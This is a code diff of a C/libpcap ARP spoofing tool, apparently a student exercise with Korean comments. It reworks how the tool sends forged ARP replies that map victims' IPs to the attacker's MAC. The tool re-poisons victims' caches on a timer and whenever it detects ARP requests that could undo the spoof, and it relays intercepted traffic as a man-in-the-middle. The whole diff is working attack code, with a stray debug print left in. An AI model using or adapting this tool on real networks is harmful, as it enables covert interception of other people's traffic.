@@ -60,7 +60,7 @@ int main(int argc, char* argv[])
             if(!check){ // sent state
                 t2 = clock();
                 // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
-                if ((t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
+                if ((double)(t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
                     check = true;
                 }
             }
@@ -101,7 +101,7 @@ int main(int argc, char* argv[])
             if(!check){ // sent state
                 t2 = clock();
                 // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
-                if ((t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
+                if ((double)(t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
                     check = true;
                 }
             }
@@ -141,42 +141,68 @@ int main(int argc, char* argv[])
 // want to sender -> ( attacker ) -> target, target -> (attacker) -> sender (== MITM attack)
 // 3. arp spoofing: sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     
-    bool need_arp_spoof_reinfect = true; // check re-infect is needed
+    bool time_arp_spoof_reinfect = true; // check re-inject time
+    bool need_arp_spoof_reinfect = false; // check re-infect is needed
     bool need_arp_spoof_reinfect_packet[101]; // check this pair must be re-infected
-    memset(need_arp_spoof_reinfect_packet, true, sizeof(need_arp_spoof_reinfect_packet));
+    memset(need_arp_spoof_reinfect_packet, false, sizeof(need_arp_spoof_reinfect_packet));
+    
+    arp_packet arp_packet_deceive_sender[101];
+    arp_packet arp_packet_deceive_target[101];
+    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
+        arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
+        arp_packet_deceive_target[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, target_mac[now_pair], sender_ip[now_pair], target_ip[now_pair]);
+    }
 
     while(true) {
-        if(need_arp_spoof_reinfect){
-            arp_packet arp_packet_deceive_sender[101];
-            arp_packet arp_packet_deceive_target[101];
-            for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
-                arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
-                arp_packet_deceive_target[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, target_mac[now_pair], sender_ip[now_pair], target_ip[now_pair]);
-            }
-            for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
-                if(need_arp_spoof_reinfect_packet[now_pair] == true){ // only re-infect pair that needs re-inject
-                    bool flg = false;
-
+        if(need_arp_spoof_reinfect || time_arp_spoof_reinfect){ // if reinfect needed
+            if(time_arp_spoof_reinfect){
+                for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
-                        printf("[Error] pair %d 's Sender Infect Packet Sending Failed.\n", now_pair + 1);
-                        flg = true;
+                        printf("[Error] pair %d's Sender Time Infect Packet Sending Failed.\n", now_pair + 1);
+                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                        need_arp_spoof_reinfect = true;
                     }
-                    else{
-                        printf("[Success] pair %d 's Sender Infect Packet Sent Successfully.\n", now_pair + 1);
-                        flg = false;
-                    }
+                    else printf("[Success] pair %d's Sender Time Infect Packet Sent Successfully.\n", now_pair + 1);
                     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_target[now_pair]), ARP_PACKET_LEN) != 0){
-                        printf("[Error] pair %d 's Target Infect Packet Sending Failed.\n", now_pair + 1);
-                        need_arp_spoof_reinfect_packet[now_pair] = flg;
+                        printf("[Error] pair %d's Target Time Infect Packet Sending Failed.\n", now_pair + 1);
+                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                        need_arp_spoof_reinfect = true;
                     }
-                    else{
-                        printf("[Success] pair %d 's Target Infect Packet Sent Successfully.\n", now_pair + 1);
-                        need_arp_spoof_reinfect_packet[now_pair] = false;
+                    else printf("[Success] pair %d's Target Time Infect Packet Sent Successfully.\n", now_pair + 1);
+                }
+                time_arp_spoof_reinfect = false;
+            }
+            else if(need_arp_spoof_reinfect){
+                for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
+                    if(need_arp_spoof_reinfect_packet[now_pair] == true){ // only re-infect pair that needs re-inject
+                        bool flg = false;
+
+                        if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
+                            printf("[Error] pair %d's Sender Infect Packet Sending Failed.\n", now_pair + 1);
+                            flg = true;
+                        }
+                        else{
+                            printf("[Success] pair %d's Sender Infect Packet Sent Successfully.\n", now_pair + 1);
+                            flg = false;
+                        }
+                        if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_target[now_pair]), ARP_PACKET_LEN) != 0){
+                            printf("[Error] pair %d's Target Infect Packet Sending Failed.\n", now_pair + 1);
+                            need_arp_spoof_reinfect_packet[now_pair] = true;
+                        }
+                        else{
+                            printf("[Success] pair %d's Target Infect Packet Sent Successfully.\n", now_pair + 1);
+                            need_arp_spoof_reinfect_packet[now_pair] = flg;
+                        }
                     }
                 }
+                need_arp_spoof_reinfect = false;
             }
-            need_arp_spoof_reinfect = false;
+            else{
+                printf("[Error] Detect Error in ReInfect Stage.\n");
+                return -1;
+            }
         }
+
         else{
 
 // 4. packet relay (sender -> attacker -> target, target -> attacker -> sender)
@@ -187,8 +213,9 @@ int main(int argc, char* argv[])
             while(true) {
                     // time check
                 t2 = clock();
+                if((t2 - t1) / CLOCKS_PER_SEC > 3) printf("now\n");
                 if ((t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){ // if relay state lasts longer than RESEND_SEC(5 sec), try re-inject
-                    need_arp_spoof_reinfect = true;
+                    time_arp_spoof_reinfect = true;
                     break;
                 }
                     // packet receive (sender -> attacker)
@@ -196,10 +223,10 @@ int main(int argc, char* argv[])
                 if (res == 0) continue;
                 if (res == -1 || res == -2) break;
 
-                bool flg = false;
                 for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                     if(need_arp_spoof_reinfect_packet[now_pair] == true){ // if pair needs re-inject
-                        flg = true; break; 
+                        need_arp_spoof_reinfect = true;
+                        break; 
                     }
 
                     uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
@@ -213,6 +240,7 @@ int main(int argc, char* argv[])
                             if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
                                 if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                                     if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from target to sender (broadcast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
                                         break;
@@ -223,6 +251,7 @@ int main(int argc, char* argv[])
                             else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
                                 if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                                     if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, sender_mac[now_pair], MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from target to sender (unicast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
                                         break;
@@ -233,6 +262,7 @@ int main(int argc, char* argv[])
                             else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
                                 if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                                     if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from sender to target (broadcast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
                                         break;
@@ -243,6 +273,7 @@ int main(int argc, char* argv[])
                             else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
                                 if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                                     if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, target_mac[now_pair], MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from sender to target (unicast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
                                         break;
@@ -250,7 +281,17 @@ int main(int argc, char* argv[])
                                 }
                             }
 
-                            else {} // another pair (using this gateway), not included in this spoofing
+                            else { // another pair (using this gateway)
+                                // 5. another case: target's ARP request broadcasting
+                                if(memcmp((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, target_mac[now_pair], MAC_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ARP_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from target to another sender (broadcast).\n");
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                            }
                         }
                     }
                         
@@ -285,8 +326,6 @@ int main(int argc, char* argv[])
                         }
                     }
                 }
-
-                if(flg) need_arp_spoof_reinfect = true;
                 if(need_arp_spoof_reinfect) break;
             }
         }
